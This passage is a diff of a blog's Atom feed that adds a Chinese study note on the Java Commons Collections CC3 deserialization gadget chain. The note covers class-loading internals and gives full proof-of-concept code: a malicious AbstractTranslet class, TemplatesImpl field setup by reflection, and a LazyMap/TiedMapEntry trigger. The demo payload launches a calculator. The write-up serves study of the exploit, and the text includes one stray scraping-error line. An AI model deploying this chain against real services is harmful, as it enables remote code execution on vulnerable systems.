@@ -8,13 +8,476 @@
     <author>
       <name>Clown</name>
     </author>
-    <updated>2023-05-23T16:00:00.000Z</updated>
+    <updated>2023-07-09T16:00:00.000Z</updated>
     <category term="Clown" />
     <category term="Web" />
     <category term="Pwn" />
     <category term="CTF" />
     <category term="AWD" />
     <category term="ACM" />
+    <entry>
+        <id>https://blog.xcu.icu/2023/07/10/CommonsCollections-3/</id>
+        <title>ConmonsCollection-3</title>
+        <link rel="alternate" href="https://blog.xcu.icu/2023/07/10/CommonsCollections-3/"/>
+        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
+&lt;p&gt;前两篇已经记录了 CC1 和突破 CC1 版本限制的 CC6，这篇记录一下 CC3 的学习，本篇中所涉及的代码都在 https://github.com/clown-q/Clown_java 中，萌新浅记，大佬轻喷&lt;/p&gt;
+&lt;h2 id=&#34;commonscollection-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#commonscollection-3&#34;&gt;#&lt;/a&gt; CommonsCollection-3&lt;/h2&gt;
+&lt;p&gt;这条链子使用了与前面两条链子中不同的命令执行的方式，前面的两篇中的 CC1 和 CC6 的链子都是直接命令调用，在 CC3 这个链子中使用了动态类加载，相当于这里是代码执行，前面是命令执行&lt;/p&gt;
+&lt;h3 id=&#34;类加载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#类加载&#34;&gt;#&lt;/a&gt; 类加载&lt;/h3&gt;
+&lt;p&gt;这里先记录一下类加载，关于类加载实际上是很大的一块内容，后面会新开一篇文章来记录，前面也有提到过类加载机制但是只是简单的记录了一下类加载的逻辑指向，这里先简单的记录等会用得上的部分：&lt;/p&gt;
+&lt;p&gt;类加载的过程中，现在方法区上面找到 class 信息，有的话直接调用，没有找到就使用类加载器加载到方法区，静态代码在类加载的时候自动执行，这里就和 java 反序列化的过程中 readObject 自动调用很像，做一个区分的话就是在初始化的时候静态代码块会自动调用，其他的在实例化的时候调用， &lt;code&gt;在使用forName的时候默认是进行初始化的&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;静态类加载demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#静态类加载demo&#34;&gt;#&lt;/a&gt; 静态类加载 demo&lt;/h4&gt;
+&lt;p&gt;眼见为实，下面测试一下，先写一个用于测试的目标类&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package CommonsCollection.Clown_CC3;
+
+
+public class ClassLoader_Person&amp;#123;
+    public String name;
+    public static int age;
+
+    static &amp;#123;
+        System.out.println(&amp;quot;静态代码块&amp;quot;);
+    &amp;#125;
+
+    &amp;#123;
+        System.out.println(&amp;quot;代码块&amp;quot;);
+    &amp;#125;
+
+    public static void test()&amp;#123;
+        System.out.println(&amp;quot;静态方法&amp;quot;);
+    &amp;#125;
+
+    public ClassLoader_Person()&amp;#123;
+        System.out.println(&amp;quot;无参的构造函数&amp;quot;);
+    &amp;#125;
+
+    public ClassLoader_Person(String name, int age)&amp;#123;
+        System.out.println(&amp;quot;有参的构造方法&amp;quot;);
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在 new 一个类的时候&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191733187.png&#34; alt=&#34;image-20230519173348127&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里没有添加参数所以调用的是无参的构造函数，两种代码块都调用了，当调用一个具体的方法的时候&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191736179.png&#34; alt=&#34;image-20230519173613149&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里构造方法和非静态代码块就不会调用了，当设置一个静态变量的时候，只会调用静态代码块&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191739606.png&#34; alt=&#34;image-20230519173924573&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;通过上面的 demo，很容易看出，实际上在 java 初始化的时候就会调用静态代码块，其他的则是在类和对象实例化的时候调用&lt;/p&gt;
+&lt;h4 id=&#34;动态类加载demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#动态类加载demo&#34;&gt;#&lt;/a&gt; 动态类加载 demo&lt;/h4&gt;
+&lt;p&gt;这里加载的还是上面用的 Person 类&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191744225.png&#34; alt=&#34;image-20230519174440189&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里使用 forName 的时候也是默认调用静态代码块&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191746502.png&#34; alt=&#34;image-20230519174604465&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;forName 这个重载的方法有参数可以设置为不初始化&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191748642.png&#34; alt=&#34;image-20230519174815600&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里通过 newInstance 实例化就可以继续正常加载了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191749778.png&#34; alt=&#34;image-20230519174959724&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;下面接着测试 LoadClass 进行类加载&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191837349.png&#34; alt=&#34;image-20230519183741289&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到在 loadclass 时是没有调用的&lt;/p&gt;
+&lt;h4 id=&#34;urlclassloader&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#urlclassloader&#34;&gt;#&lt;/a&gt; URLClassLoader&lt;/h4&gt;
+&lt;p&gt;其中默认类加载器的继承关系&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201148169.png&#34; alt=&#34;image-20230520114825127&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里的 URLClassLoader 方法是 AppClassLoader 的父类，所以 URLClassLoader 的工作流程也是默认的类加载器的工作流程&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201159335.png&#34; alt=&#34;image-20230520115927300&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;URLClassLoader 中传入一个 URL，从 URL 中加载出目标类，也就是说可以通过 urlClassLoader 实现任意类加载&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package CommonsCollection.Clown_CC3;
+
+
+import java.net.URL;
+import java.net.URLClassLoader;
+
+public class ClassLoaderTest &amp;#123;
+    public static void main(String[] args) throws Exception&amp;#123;
+        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&amp;#123;new URL(&amp;quot;file:///D:\\tmp\\&amp;quot;)&amp;#125;);
+        Class&amp;lt;?&amp;gt; c = urlClassLoader.loadClass(&amp;quot;Test&amp;quot;);
+        c.newInstance();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里通过 file 协议加载的 TEst 文件的作用就是弹出计算器&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201321174.png&#34; alt=&#34;image-20230520132151122&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201322363.png&#34; alt=&#34;image-20230520132226319&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;同样这里也可以使用 http 协议利用更加方便，这种命令执行的方式更加灵活&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201324754.png&#34; alt=&#34;image-20230520132413708&#34; /&gt;&lt;/p&gt;
+&lt;h4 id=&#34;defineclass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#defineclass&#34;&gt;#&lt;/a&gt; defineClass&lt;/h4&gt;
+&lt;p&gt;上面介绍了通过 URLClassLoader 方法实现任意方法执行，这里在介绍一下 defineClass，上面的使用 http 协议虽然运用灵活，但是在实际利用中需要出网，而在 define 中这里只需要加载字节码不需要出网就可以利用&lt;/p&gt;
+&lt;p&gt;在上面的流程中实际上&lt;/p&gt;
+&lt;pre&gt;TimeoutError: Navigation timeout of 30000 ms exceeded&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行&lt;/li&gt;
+&lt;li&gt;findClass findClass 的作用是根据基础 URL 指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar 包或远程 http 服务器上读取字节码，然后交给 defineClass&lt;/li&gt;
+&lt;li&gt;defineClass 的作用是处理前面传入的字节码，将其处理成真正的 Java 类&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这里实际上就是直接去调用 define 来进行代码执行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201438815.png&#34; alt=&#34;image-20230520143858761&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package CommonsCollection.Clown_CC3;
+
+
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class defineClassTest &amp;#123;
+    public static void main(String[] args) throws Exception&amp;#123;
+        ClassLoader classLoader =ClassLoader.getSystemClassLoader();
+        Method defineClass = ClassLoader.class.getDeclaredMethod(&amp;quot;defineClass&amp;quot;, String.class, byte[].class, int.class, int.class);
+        defineClass.setAccessible(true);
+        byte[] code = Files.readAllBytes(Paths.get(&amp;quot;D:\\tmp\\Test.class&amp;quot;));
+        Class test = (Class) defineClass.invoke(classLoader, &amp;quot;Test&amp;quot;, code, 0, code.length);
+        test.newInstance();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201439456.png&#34; alt=&#34;image-20230520143930404&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;cc3链子分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cc3链子分析&#34;&gt;#&lt;/a&gt; CC3 链子分析&lt;/h2&gt;
+&lt;p&gt;前面也提到 CC3 使用类加载进行代码执行，这里 CC3 作者也是使用 defineClass 这个方法去进行代码执行&lt;/p&gt;
+&lt;h3 id=&#34;代码执行逻辑分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码执行逻辑分析&#34;&gt;#&lt;/a&gt; 代码执行逻辑分析&lt;/h3&gt;
+&lt;p&gt;最后想要利用到的点是 defineClass&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710082241036.png&#34; alt=&#34;image-20230710082241036&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;但是这里是一个被 protected 修饰的方法，只能对于本包和其子类可见，虽然大部分的上层开发者不会使用到 defineClass 方法，但是还是有一些底层的类使用到了它，这就是 TemplatesImpl，这里可以通过 Alt+F7 去查找有哪些地方调用了这个 defineClass 方法，最后也是找到在 TemplatesImpl 类中有一个调用，没有显式地声明其定义域。Java 中默认情况下，如果一个 方法没有显式声明作用域，其作用域为 default。所以也就是说这里的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710084307534.png&#34; alt=&#34;image-20230710084307534&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里接着找哪里调用了它&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710085207571.png&#34; alt=&#34;image-20230710085207571&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里是在 defineTransletClasses 中有一个调用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710085433761.png&#34; alt=&#34;image-20230710085433761&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里看到，它也是一个私有的方法，这里接着追溯一下哪里有调用这个方法&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710085646563.png&#34; alt=&#34;image-20230710085646563&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里一共也是找到了三处调用，这里分别看一下几处调用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710090742178.png&#34; alt=&#34;image-20230710090742178&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里是直接将 class 返回回来&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710090947197.png&#34; alt=&#34;image-20230710090947197&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里返回了一个下标&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710091144929.png&#34; alt=&#34;image-20230710091144929&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里有一个 newInstance 方法会进行一个初始化，代码执行的两个条件类加载和初始化就满足了，但是这个方法也是私有的，所以这里还需要往回找&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710091832347.png&#34; alt=&#34;image-20230710091832347&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;最后是找到 newTransformer 中调用，且是一个公共的方法，这里找到这就基本可以代码执行了，总结一下流程大概就下面这个样子&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710093731368.png&#34; alt=&#34;image-20230710093731368&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#demo&#34;&gt;#&lt;/a&gt; demo&lt;/h3&gt;
+&lt;p&gt;上面吧整个流程整理清楚了，下面开始构造一个简单的 poc 来执行任意代码&lt;/p&gt;
+&lt;p&gt;这里先构造要加载的字节码，值得注意的是 TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类，但是为什么呢，这里可以先构造一个不继承的调试看一下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;package CommonsCollection.Clown_CC3;
+
+import java.io.IOException;
+
+/**
+ * @BelongsProject: study_java
+ * @BelongsPackage: CommonsCollection.Clown_CC3
+ * @Author: Clown
+ * @CreateTime: 2023-07-10  10:00
+ */
+public class Test &amp;#123;
+    static &amp;#123;
+        try &amp;#123;
+            Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);
+        &amp;#125; catch (IOException e) &amp;#123;
+            throw new RuntimeException(e);
+        &amp;#125;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先构造一个这样的代码，来通过 TemplatesImpl 方法来执行&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;package CommonsCollection.Clown_CC3;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+
+public class POC1 &amp;#123;
+    public static void Serliazation(Object object) throws Exception&amp;#123;
+        FileOutputStream fileInputStream = new FileOutputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileInputStream);
+        objectOutputStream.writeObject(object);
+        System.out.println(&amp;quot;Output&amp;quot;);
+    &amp;#125;
+
+    public static void Unserlization() throws Exception&amp;#123;
+        FileInputStream fileInputStream =new FileInputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectInputStream objectInputStream =new ObjectInputStream(fileInputStream);
+        objectInputStream.readObject();
+        System.out.println(&amp;quot;Input&amp;quot;);
+    &amp;#125;
+
+    public static void main(String[] args) throws Exception&amp;#123;
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&amp;lt;? extends TemplatesImpl&amp;gt; aClass = templates.getClass();
+        Field name = aClass.getDeclaredField(&amp;quot;_name&amp;quot;);
+        name.setAccessible(true);
+        name.set(templates,&amp;quot;aaaa&amp;quot;);
+
+        Field bytecodes = aClass.getDeclaredField(&amp;quot;_bytecodes&amp;quot;);
+        bytecodes.setAccessible(true);
+        byte[] code = Files.readAllBytes(Paths.get(&amp;quot;E:\\study_java\\test\\Test.class&amp;quot;));
+        byte[][] codes = &amp;#123;code&amp;#125;;
+        bytecodes.set(templates,codes);
+
+        Field tfactory = aClass.getDeclaredField(&amp;quot;_tfactory&amp;quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        
+        templates.newTransformer();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里通过反射设置了三个值，先来看一下为什么这样设置，上面的逻辑分析中可以看到入口点是 newTransformer&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710102549579.png&#34; alt=&#34;image-20230710102549579&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里实际上是想要调用 getTransletInstance 方法，看一下这里构造方法没有做任何的操作&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710102700983.png&#34; alt=&#34;image-20230710102700983&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;追溯到想要调用的方法中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710102945468.png&#34; alt=&#34;image-20230710102945468&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里_name 为空会直接返回 null，所以上面通过反射将__name 任意设置了一个值，_class 要为空才行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5CClown%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230710103502179.png&#34; alt=&#34;image-20230710103502179&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;进一步追溯到 defineTransletClasses，这里如果_bytecodes 为空会抛出一个异常，当然它是要执行的字节码不会为空，_tfactory 如果为空会抛出空指针异常&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710103723295.png&#34; alt=&#34;image-20230710103723295&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里发现_tfactory 变量是一个 transient 不能被序列化，但是 TemplatesImpl 又继承了 Serializable 所以这里是在 readObject 中有赋值&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710103938134.png&#34; alt=&#34;image-20230710103938134&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里因为目前是想要直接去代码执行所以，这里就先通过反射赋值，这样运行上面的代码会报错&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104056655.png&#34; alt=&#34;image-20230710104056655&#34; /&gt;&lt;/p&gt;
+&lt;h4 id=&#34;调试解释继承abstracttranslet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#调试解释继承abstracttranslet&#34;&gt;#&lt;/a&gt; 调试解释继承 AbstractTranslet&lt;/h4&gt;
+&lt;p&gt;可以看到这里报了一个空指针的错误，错误位置在 defineTransletClasses，这里就是最开始说的那个 TemplatesImpl 中对加载的字节码是有一定要求，这里在 defineTransletClasses 下断点调试一下，看一下为什么会这样&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104458309.png&#34; alt=&#34;image-20230710104458309&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里看到 bytecode 不是 null 已经赋值了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104614590.png&#34; alt=&#34;image-20230710104614590&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到 tfactory 不是 null 也已经走过来了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104724415.png&#34; alt=&#34;image-20230710104724415&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们的目标 defineClass 类加载其实也是成功的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104855201.png&#34; alt=&#34;image-20230710104855201&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里就是报错的问题所在了，首先这里会判断他的父类的名字是不是常量&lt;em&gt; ABSTRACT_TRANSLET&lt;/em&gt;，如果是就将_transletIndex 赋值为 - 1，如果不是就调用一个 put，这里的_auxClasses 是一个 null 所以报错&lt;/p&gt;
+&lt;p&gt;这里两种解决思路，一是继承常量指定的类&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710105414239.png&#34; alt=&#34;image-20230710105414239&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;第二种方式就是给_auxClasses，一个值，但是后面判断_transletIndex 小于 1 会抛出一个异常&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710105503172.png&#34; alt=&#34;image-20230710105503172&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里最终是选择前者，所以要执行的代码块就要改为&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;package CommonsCollection.Clown_CC3;
+
+import java.io.IOException;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+/**
+ * @BelongsProject: study_java
+ * @BelongsPackage: CommonsCollection.Clown_CC3
+ * @Author: Clown
+ * @CreateTime: 2023-07-10  10:00
+ */
+public class Test extends AbstractTranslet&amp;#123;
+    static &amp;#123;
+        try &amp;#123;
+            Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);
+        &amp;#125; catch (IOException e) &amp;#123;
+            throw new RuntimeException(e);
+        &amp;#125;
+    &amp;#125;
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &amp;#123;
+
+    &amp;#125;
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &amp;#123;
+        
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在尝试运行就成功了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710110200835.png&#34; alt=&#34;image-20230710110200835&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;整合cc链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#整合cc链&#34;&gt;#&lt;/a&gt; 整合 CC 链&lt;/h3&gt;
+&lt;p&gt;上面有了代码执行的部分，这里整合到 CC6 的前半段就行&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;package CommonsCollection.Clown_CC3;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.security.transforms.Transform;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class POC1 &amp;#123;
+    public static void Serliazation(Object object) throws Exception&amp;#123;
+        FileOutputStream fileInputStream = new FileOutputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileInputStream);
+        objectOutputStream.writeObject(object);
+        System.out.println(&amp;quot;Output&amp;quot;);
+    &amp;#125;
+
+    public static void Unserlization() throws Exception&amp;#123;
+        FileInputStream fileInputStream =new FileInputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectInputStream objectInputStream =new ObjectInputStream(fileInputStream);
+        objectInputStream.readObject();
+        System.out.println(&amp;quot;Input&amp;quot;);
+    &amp;#125;
+
+    public static void main(String[] args) throws Exception&amp;#123;
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&amp;lt;? extends TemplatesImpl&amp;gt; aClass = templates.getClass();
+        Field name = aClass.getDeclaredField(&amp;quot;_name&amp;quot;);
+        name.setAccessible(true);
+        name.set(templates,&amp;quot;aaaa&amp;quot;);
+
+        Field bytecodes = aClass.getDeclaredField(&amp;quot;_bytecodes&amp;quot;);
+        bytecodes.setAccessible(true);
+        byte[] code = Files.readAllBytes(Paths.get(&amp;quot;E:\\study_java\\test\\Test.class&amp;quot;));
+        byte[][] codes = &amp;#123;code&amp;#125;;
+        bytecodes.set(templates,codes);
+
+        Field tfactory = aClass.getDeclaredField(&amp;quot;_tfactory&amp;quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+
+//        templates.newTransformer();
+        Transformer[] transformers = new Transformer[]&amp;#123;
+                new ConstantTransformer(templates),
+                new InvokerTransformer(&amp;quot;newTransformer&amp;quot;,null,null),
+        &amp;#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap map = new HashMap();
+        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏
+//        Map lazymap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&amp;quot;aaa&amp;quot;);
+
+        HashMap&amp;lt;Object, Object&amp;gt; map2 = new HashMap&amp;lt;&amp;gt;();//这里是触发点
+        map2.put(tiedMapEntry,&amp;quot;bbb&amp;quot;);
+        lazymap.remove(&amp;quot;aaa&amp;quot;);//这里将序列化过程中存入的key删除
+
+        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值
+        Field factoryField = clazz.getDeclaredField(&amp;quot;factory&amp;quot;);
+        factoryField.setAccessible(true);//私有属性
+        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数
+
+        Serliazation(map2);
+        Unserlization();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710111411877.png&#34; alt=&#34;image-20230710111411877&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;最后的流程大概这样&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710112102028.png&#34; alt=&#34;image-20230710112102028&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;补充&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#补充&#34;&gt;#&lt;/a&gt; 补充&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;package CommonsCollection.Clown_CC3;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
